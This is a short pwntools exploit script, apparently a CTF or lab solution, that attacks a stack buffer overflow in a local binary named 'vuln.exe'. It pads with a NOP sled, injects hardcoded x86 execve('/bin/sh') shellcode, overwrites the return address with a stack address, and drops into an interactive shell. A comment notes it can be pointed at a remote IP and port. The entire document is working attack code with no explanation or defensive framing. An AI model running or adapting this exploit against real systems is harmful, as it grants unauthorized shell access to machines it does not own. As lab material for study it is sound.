from pwn import *

# Set architecture to x86
context(arch='i386', os='linux')

# Start process (or remote connection)
p = process('./vuln.exe')  # Change to remote('IP', port) if targeting remote

# Offset to overwrite return address
offset = 76  # fixme

# Generate shellcode (execve("/bin/sh"))
# shellcode = asm(shellcraft.sh())
shellcode_user = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

# find address of buffer
buffer_add = p32(0xffffb110)  # Replace with actual address from gdb

# Construct payload: padding + jmp_esp + shellcode
payload = b"\x90" * (offset - len(shellcode_user))  # Fill buffer with NOPs
payload += shellcode_user     # Inject shellcode
payload += buffer_add  # Overwrite return address with address of buffer
print(f'Payload length: {len(payload)}')


# Send payload
p.sendline(payload)

# Get interactive shell
p.interactive()
